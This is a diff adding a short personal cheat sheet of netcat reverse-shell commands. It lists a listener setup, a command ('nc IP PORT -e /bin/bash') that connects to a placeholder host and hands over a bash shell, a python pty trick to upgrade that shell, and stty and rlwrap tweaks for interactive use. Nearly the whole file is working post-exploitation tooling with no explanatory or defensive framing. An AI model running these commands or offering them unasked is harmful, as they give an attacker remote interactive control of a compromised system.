@@ -1,0 +1,17 @@
+netcat commands
+
+listener = nc -lvnp "port"
+ 
+nc execute = nc "IP" "PORT" -e /bin/bash
+
+ttyshell spawn = python -c 'import pty; pty.spawn("/bin/bash")'    
+
+nc TAB completion = stty raw -echo (background the shell before executing this command for background use "ctrl+z" and press "ctrl+z" to interact the reverseshell again)
+
+nc clear command = export TERM=xterm 
+
+rlwrap nc -lvnp PORT = all arrow direction 
+
+
+
+
